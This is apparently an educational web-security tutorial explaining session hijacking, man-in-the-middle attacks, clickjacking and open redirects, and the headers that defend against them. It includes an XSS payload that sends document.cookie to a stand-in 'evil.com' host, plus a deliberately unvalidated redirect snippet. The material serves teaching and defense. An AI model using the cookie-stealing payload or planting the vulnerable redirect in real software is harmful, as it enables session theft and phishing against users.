1 Session Hijacking

Session hijacking (or cookie hijacking) occurs when an attacker steals a user's session cookie and uses it to impersonate them. The server sees the valid cookie and thinks the attacker is the legitimate user.

👤 Victim logs in
→
Server
→
Cookie set
→
Attacker steals cookie
→
Attacker impersonates!

😈 How cookies are stolen

  • XSS: <script>document.location='evil.com?c='+document.cookie</script>
  • MITM: Sniff unencrypted HTTP traffic on public WiFi
  • Malware: Read browser cookie stores
  • Session fixation: Force victim to use attacker's session ID
  • Physical access: Unlocked computer

✓ How to prevent

  • HttpOnly — blocks XSS-based theft
  • Secure — blocks MITM sniffing
  • HTTPS + HSTS — encrypts all traffic
  • Regenerate session ID after login
  • CSRF tokens — even with cookie, can't forge requests
  • Fingerprinting — detect unusual access patterns
⚠ Session hijacking is the #1 reason for HttpOnly. Without it, a single XSS vulnerability gives the attacker full access to every session cookie.
2 Man-in-the-Middle (MITM)

An attacker intercepts communication between client and server. They can read (sniff) and modify traffic.

💻 You → bank.com
🕵 Attacker (reads everything!)
🏦 Server (sees attacker, not you)

Common MITM scenarios:

  • Public WiFi (coffee shop, airport)
  • Compromised router
  • DNS spoofing
  • ARP poisoning
  • Evil twin hotspot

▶ MITM Attack simulation

On HTTP (no encryption):

✗ Captured by attacker!
POST /login HTTP/1.1
Host: bank.com
password=secret123&session=abc

On HTTPS (encrypted):

✓ Encrypted — attacker sees gibberish
POST /login HTTP/1.1
Host: bank.com
💭💭💭💭💭💭💭💭💭💭
Defense: HTTPS + HSTS (HTTP Strict Transport Security) ensures the browser never falls back to HTTP. The Secure cookie flag ensures cookies are never sent over HTTP.
3 Clickjacking

Clickjacking tricks users into clicking something different from what they see. The attacker loads the target site in a transparent iframe overlaid on a decoy page.

Win a free iPhone!

Click the button below to claim your prize

😍 Claim Now
(What the user sees)
😈 Hidden transparent iframe
facebook.com/delete-account
(Invisible — user doesn't see this)

How it works:

  1. Attacker creates an innocent-looking page
  2. Overlays a transparent iframe pointing to victim site
  3. Aligns the iframe so "Claim Now" button is over "Delete" button
  4. User clicks — thinks they're claiming a prize
  5. Actually clicked "Delete Account" on the hidden iframe
Defense: Set X-Frame-Options: DENY or use CSP frame-ancestors 'none' to prevent your site from being iframed.
4 Open Redirect

An attacker uses a vulnerable redirect on a trusted domain to send users to a malicious site. Users trust the familiar domain and click.

// VULNERABLE redirect: app.get('/redirect', (req, res) => { res.redirect(req.query.url); // No validation! }); // Attacker sends: https://bank.com/redirect?url=https://evil.com/login"> Sign in to your account
What the user sees in the address bar:
https://bank.com/redirect?url=...
Looks safe — it's bank.com!

Where they actually end up:
https://evil.com/phishing-page
Often used for phishing (fake login pages) and bypassing URL scanners.
5 Other Key Defenses

CSP (Content Security Policy)

A browser security header that controls which resources can load on your page. Blocks inline scripts, restricts domains, and prevents XSS even if injection occurs.

Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com; style-src 'self' 'unsafe-inline'; img-src *; frame-ancestors 'none';

Example: Blocks inline <script> tags, only allows scripts from your domain.

HSTS (HTTP Strict Transport Security)

Forces the browser to always use HTTPS for your domain. Prevents MITM downgrade attacks (SSL stripping).

Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

Once set, browser refuses HTTP connections to your site for max-age seconds.

X-Frame-Options

Prevents your site from being embedded in iframes on other domains (clickjacking protection).

X-Frame-Options: DENY // or: SAMEORIGIN (allows same-domain iframes)

Subresource Integrity (SRI)

Ensures external scripts/styles haven't been tampered with. Browser compares hash of fetched file with expected hash.

<script src="https://cdn.example.com/lib.js" integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC" crossorigin="anonymous">
